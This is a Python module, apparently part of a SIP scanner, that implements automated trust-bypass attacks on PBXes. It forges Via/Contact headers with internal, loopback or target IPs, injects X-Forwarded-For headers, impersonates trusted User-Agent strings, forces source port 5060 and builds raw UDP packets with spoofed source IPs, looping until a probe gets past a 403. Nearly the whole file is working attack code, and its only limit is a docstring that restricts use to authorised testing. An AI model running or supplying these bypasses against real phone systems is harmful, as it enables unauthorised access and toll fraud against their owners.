"""SIP source-IP spoofing and header-bypass strategies for authorised pen testing.

USE ONLY ON SYSTEMS YOU OWN OR ARE EXPLICITLY AUTHORISED TO TEST.

Techniques implemented
──────────────────────
header_spoof    Override Via/Contact IP in SIP headers — no privilege needed.
                Decouples the socket bind-IP from what the PBX reads. Many
                PBXes trust requests whose Via/Contact shows an RFC1918 or
                loopback IP, even when the UDP packet arrives from the internet.

xff_inject      Inject X-Forwarded-For / X-Real-IP extra headers. Effective
                against SIP proxies and SBCs that forward these headers inward
                and apply trust decisions based on them.

src_port_trust  Bind source port to 5060. Some PBXes treat src-port=5060 as an
                implicit peer-trust indicator and relax auth requirements.

ua_impersonate  Send a User-Agent banner that matches a known internal device
                (Asterisk PBX, FreePBX, Grandstream, etc.). Useful when the PBX
                enforces allowlists on UA strings for trunk authentication.

target_loopback Use the target's own IP in Via/Contact. Triggers local-loopback
                trust on PBXes that grant "allow_anonymous=yes" for self-sourced
                requests (misconfigured Asterisk, FreeSWITCH, Kamailio).

pbx_via_spoof   Replay the IP the PBX announced in its own Via header back at
                it. Some PBXes validate Via host-match and grant peer trust when
                they recognise their own address.

raw_spoof       True packet-level UDP spoofing via raw socket. Requires
                CAP_NET_RAW or root. One-way only — no response received because
                the spoofed source IP is not real. Use to test whether the PBX
                performs source-IP validation at the IP layer (fail2ban, iptables
                ACL) rather than just at the SIP header layer.
"""
from __future__ import annotations

import socket
import struct
from dataclasses import dataclass, field
from typing import Callable, Literal

# ---------------------------------------------------------------------------
# Constant tables
# ---------------------------------------------------------------------------

# RFC 1918 / loopback IPs to try for header-level trust bypass (ordered by
# likelihood of granting trust).
TRUSTED_RANGE_IPS: list[str] = [
    "127.0.0.1",      # loopback — maximum local-trust on naive PBXes
    "10.0.0.1",       # RFC1918 class-A common gateway
    "192.168.1.1",    # RFC1918 class-C common gateway
    "172.16.0.1",     # RFC1918 class-B common gateway
    "10.0.0.100",
    "10.10.0.1",
    "192.168.0.1",
    "172.31.0.1",
    "10.1.1.1",
]

# User-Agent strings that often receive peer / trunk trust.
TRUSTED_UAS: list[str] = [
    "Asterisk PBX 18.16.0",
    "FreePBX 16.0.19",
    "Cisco-SIPGateway/IOS-15.2",
    "grandstream 1.0",
    "3CXPhoneSystem/18.0.0.717",
    "Yealink SIP-T46U 84.86.0.20",
    "FPBX-16.0.19.9(18.16.0)",
    "PolycomVVX-VVX_500-UA/5.9.7.3480",
]

SpoofStrategy = Literal[
    "target_loopback",
    "xff_inject",
    "header_spoof",
    "src_port_trust",
    "ua_impersonate",
    "pbx_via_spoof",
    "raw_spoof",
]


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------

@dataclass
class SpoofAttempt:
    """One spoofing variant."""
    strategy: SpoofStrategy
    description: str
    header_ip: str | None = None          # override Via/Contact IP (headers only)
    extra_headers: list[str] = field(default_factory=list)
    source_port: int | None = None        # force source port (e.g. 5060)
    user_agent: str | None = None         # override User-Agent
    raw_spoof_src: str | None = None      # for raw_spoof: the fake source IP


@dataclass
class SpoofResult:
    """Outcome of a single spoofing probe."""
    attempt: SpoofAttempt
    success: bool
    status_code: int | None = None
    reason: str = ""
    evidence: str = ""


# ---------------------------------------------------------------------------
# Bypass strategy builder
# ---------------------------------------------------------------------------

def build_bypass_attempts(
    target_host: str,
    real_local_ip: str,
    pbx_via_ip: str | None = None,
    include_raw: bool = False,
    strategies: list[SpoofStrategy] | None = None,
) -> list[SpoofAttempt]:
    """Return an ordered list of bypass attempts to try after a blocked response.

    strategies: optional explicit list; when None all non-raw strategies are
    returned (raw_spoof requires explicit opt-in via include_raw=True).
    """
    all_strats: set[SpoofStrategy] = set(strategies) if strategies else {
        "target_loopback", "xff_inject", "header_spoof",
        "src_port_trust", "ua_impersonate", "pbx_via_spoof",
    }
    if include_raw:
        all_strats.add("raw_spoof")

    attempts: list[SpoofAttempt] = []

    # 1 ── Target's own IP in Via/Contact (self-loopback trust exploit)
    if "target_loopback" in all_strats:
        attempts.append(SpoofAttempt(
            strategy="target_loopback",
            description=f"Via/Contact → target's own IP {target_host} (local-trust bypass)",
            header_ip=target_host,
        ))
        # Also combine with XFF
        attempts.append(SpoofAttempt(
            strategy="target_loopback",
            description=f"Via/Contact → {target_host} + X-Forwarded-For: {target_host}",
            header_ip=target_host,
            extra_headers=[f"X-Forwarded-For: {target_host}", f"X-Real-IP: {target_host}"],
        ))

    # 2 ── X-Forwarded-For injection (proxy / reverse-proxy trust bypass)
    if "xff_inject" in all_strats:
        for trusted in ("127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1"):
            attempts.append(SpoofAttempt(
                strategy="xff_inject",
                description=f"X-Forwarded-For: {trusted} + X-Real-IP: {trusted}",
                extra_headers=[
                    f"X-Forwarded-For: {trusted}",
                    f"X-Real-IP: {trusted}",
                ],
            ))
            # Combined with header IP
            if trusted != real_local_ip:
                attempts.append(SpoofAttempt(
                    strategy="xff_inject",
                    description=f"Via/Contact → {trusted}, X-Forwarded-For: {trusted}",
                    header_ip=trusted,
                    extra_headers=[
                        f"X-Forwarded-For: {trusted}",
                        f"X-Real-IP: {trusted}",
                    ],
                ))

    # 3 ── RFC1918 header spoofing (Via/Contact show internal IP)
    if "header_spoof" in all_strats:
        for rfc1918 in TRUSTED_RANGE_IPS:
            if rfc1918 not in ("127.0.0.1", target_host, real_local_ip):
                attempts.append(SpoofAttempt(
                    strategy="header_spoof",
                    description=f"Via/Contact → RFC1918 {rfc1918}",
                    header_ip=rfc1918,
                ))

    # 4 ── Use PBX's own advertised Via IP (peer self-trust)
    if "pbx_via_spoof" in all_strats and pbx_via_ip:
        if pbx_via_ip not in (real_local_ip, target_host):
            attempts.append(SpoofAttempt(
                strategy="pbx_via_spoof",
                description=f"Via/Contact → PBX advertised IP {pbx_via_ip}",
                header_ip=pbx_via_ip,
            ))

    # 5 ── Source port 5060 (peer-trust on port 5060 in some configs)
    if "src_port_trust" in all_strats:
        attempts.append(SpoofAttempt(
            strategy="src_port_trust",
            description="Source port 5060 (implicit peer-trust on some PBXes)",
            source_port=5060,
        ))
        # Combine with loopback header
        attempts.append(SpoofAttempt(
            strategy="src_port_trust",
            description="Source port 5060 + Via/Contact → 127.0.0.1",
            source_port=5060,
            header_ip="127.0.0.1",
        ))

    # 6 ── User-Agent impersonation
    if "ua_impersonate" in all_strats:
        for ua in TRUSTED_UAS[:4]:
            attempts.append(SpoofAttempt(
                strategy="ua_impersonate",
                description=f"User-Agent: {ua}",
                user_agent=ua,
            ))
            # Combine UA with RFC1918 header IP for maximum bypass chance
            attempts.append(SpoofAttempt(
                strategy="ua_impersonate",
                description=f"User-Agent: {ua} + Via/Contact → 10.0.0.1",
                user_agent=ua,
                header_ip="10.0.0.1",
            ))

    # 7 ── Raw UDP packet-level spoofing (CAP_NET_RAW / root required)
    if "raw_spoof" in all_strats:
        for fake_src in ("127.0.0.1", "10.0.0.1", target_host):
            attempts.append(SpoofAttempt(
                strategy="raw_spoof",
                description=f"Raw UDP packet: spoofed src IP {fake_src} (one-way, tests IP ACL)",
                raw_spoof_src=fake_src,
            ))

    return attempts


# ---------------------------------------------------------------------------
# Raw socket IP spoof (packet-level, CAP_NET_RAW required)
# ---------------------------------------------------------------------------

def _inet_checksum(data: bytes) -> int:
    """RFC 1071 internet checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_udp_header(
    src_ip: str, dst_ip: str,
    src_port: int, dst_port: int,
    payload: bytes,
) -> bytes:
    length = 8 + len(payload)
    pseudo = (
        socket.inet_aton(src_ip)
        + socket.inet_aton(dst_ip)
        + struct.pack("!BBH", 0, 17, length)
    )
    udp = struct.pack("!HHHH", src_port, dst_port, length, 0)
    ck = _inet_checksum(pseudo + udp + payload)
    return struct.pack("!HHHH", src_port, dst_port, length, ck)


def _build_ip_header(src_ip: str, dst_ip: str, payload: bytes) -> bytes:
    total_len = 20 + len(payload)
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len,
        0, 0,
        64, 17, 0,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    ck = _inet_checksum(ip)
    return ip[:10] + struct.pack("!H", ck) + ip[12:]


def raw_udp_spoof(
    src_ip: str,
    dst_ip: str,
    dst_port: int,
    payload: bytes,
    src_port: int = 5060,
) -> tuple[bool, str]:
    """Send a UDP datagram with a forged source IP via raw socket.

    Requires CAP_NET_RAW or root. One-way — no response is received because the
    source IP doesn't belong to this host.  Returns (success, diagnostic_msg).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        return False, "CAP_NET_RAW required — run as root or: setcap cap_net_raw+ep python3"
    except OSError as exc:
        return False, str(exc)

    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        udp_hdr = _build_udp_header(src_ip, dst_ip, src_port, dst_port, payload)
        ip_hdr  = _build_ip_header(src_ip, dst_ip, udp_hdr + payload)
        s.sendto(ip_hdr + udp_hdr + payload, (dst_ip, 0))
        return True, f"Sent raw UDP {src_ip}:{src_port} → {dst_ip}:{dst_port} ({len(payload)}B)"
    except Exception as exc:
        return False, str(exc)
    finally:
        try:
            s.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Auto-bypass probe loop
# ---------------------------------------------------------------------------

def auto_spoof_probe(
    target_host: str,
    target_port: int,
    build_msg_fn: Callable[..., bytes],
    send_recv_fn: Callable[[bytes], bytes | None],
    real_local_ip: str,
    pbx_via_ip: str | None = None,
    include_raw: bool = False,
    strategies: list[SpoofStrategy] | None = None,
    progress_cb: Callable[[str], None] | None = None,
) -> tuple[SpoofAttempt | None, object]:
    """Try all bypass strategies until one gets a non-403/non-None SIP response.

    build_msg_fn(header_ip, extra_headers, user_agent) → bytes
    send_recv_fn(msg: bytes) → raw_bytes | None

    Returns (winning_attempt, SipResponse) or (None, None).
    """
    from scanner import sip as _sip

    attempts = build_bypass_attempts(
        target_host, real_local_ip, pbx_via_ip,
        include_raw=include_raw, strategies=strategies,
    )

    for attempt in attempts:
        if progress_cb:
            progress_cb(f"  bypass: {attempt.strategy} — {attempt.description}")

        try:
            msg = build_msg_fn(
                header_ip=attempt.header_ip,
                extra_headers=attempt.extra_headers or None,
                user_agent=attempt.user_agent,
            )

            if attempt.strategy == "raw_spoof" and attempt.raw_spoof_src:
                ok, diag = raw_udp_spoof(
                    attempt.raw_spoof_src, target_host, target_port, msg,
                )
                if ok:
                    return attempt, None   # one-way: no response expected
                continue

            raw = send_recv_fn(msg)
            if raw is None:
                continue
            resp = _sip.parse_response(raw)
            if resp is None:
                continue
            if resp.status_code != 403:
                return attempt, resp
        except Exception:
            continue

    return None, None


def format_spoof_result(attempt: SpoofAttempt, resp_code: int | None) -> str:
    """Human-readable one-liner for a successful bypass."""
    code = f"→ {resp_code}" if resp_code else "→ sent (raw/one-way)"
    return f"[BYPASS HIT] {attempt.strategy}: {attempt.description} {code}"
